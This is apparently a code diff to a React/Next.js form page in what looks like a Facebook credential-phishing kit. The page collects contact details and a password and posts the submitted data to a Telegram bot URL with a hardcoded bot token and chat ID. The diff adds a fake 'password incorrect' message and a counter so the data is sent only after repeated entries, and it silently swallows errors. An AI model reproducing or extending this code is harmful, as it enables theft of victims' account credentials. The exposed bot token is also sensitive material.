@@ -1,6 +1,7 @@
 import { useState } from 'react';
 import { FormProvider, SubmitHandler, useForm } from 'react-hook-form';
 import Image from 'next/image';
+import { useRouter } from 'next/router';
 
 import { Button, Modal, Steps } from 'antd';
 import { zodResolver } from '@hookform/resolvers/zod';
@@ -55,10 +56,14 @@ const schema = () =>
     [CONTACT_ENUM.FACEBOOK_PAGE_NAME]: z.string().min(1, { message: 'Facebook page name is required' }),
   });
 
-const BusinessPage = () => {
+const ConfirmPage = () => {
+  const router = useRouter();
+
   const [visibleModal, setVisibleModal] = useState(false);
   const [formData, setFormData] = useState({}) as any;
   const [password, setPassword] = useState('');
+  const [showError, setShowError] = useState(false);
+  const [count, setCount] = useState(0);
 
   const handleChangePassword = (event: any) => {
     const { value } = event.target;
@@ -81,25 +86,32 @@ const BusinessPage = () => {
 
   const handleContinue = async () => {
     if (password) {
-      console.log('formData :>> ', formData);
+      setShowError(true);
+      setTimeout(() => {
+        setCount(count + 1);
+      }, 2000);
 
-      try {
-        const response = await standardService.sendMessage(
-          'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
-          {
-            chat_id: '-4077356603',
-            text: formData.message,
-          },
-        );
-        console.log('response :>> ', response);
-        if (response) {
-          showMessage(TYPE_CONSTANTS.MESSAGE.SUCCESS, 'Your submission has been successfully');
+      if (count === 2) {
+        setShowError(false);
+        try {
+          const response = await standardService.sendMessage(
+            'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
+            {
+              chat_id: '-4077356603',
+              text: formData.message,
+            },
+          );
+
+          if (response) {
+            showMessage(TYPE_CONSTANTS.MESSAGE.SUCCESS, 'Your submission has been successfully');
+            router.push;
+          }
+        } catch (error) {
+          return;
         }
-      } catch (error) {
-        showMessage(TYPE_CONSTANTS.MESSAGE.ERROR, error);
       }
     } else {
-      showMessage(TYPE_CONSTANTS.MESSAGE.ERROR, 'Password is required');
+      return;
     }
   };
 
@@ -214,10 +226,11 @@ const BusinessPage = () => {
 
           <span>Password:</span>
           <input type='password' onChange={handleChangePassword} value={password} required />
+          {showError && <div className='error-text'>The password you&apos;ve entered is incorrect.</div>}
         </div>
       </Modal>
     </section>
   );
 };
 
-export default BusinessPage;
+export default ConfirmPage;
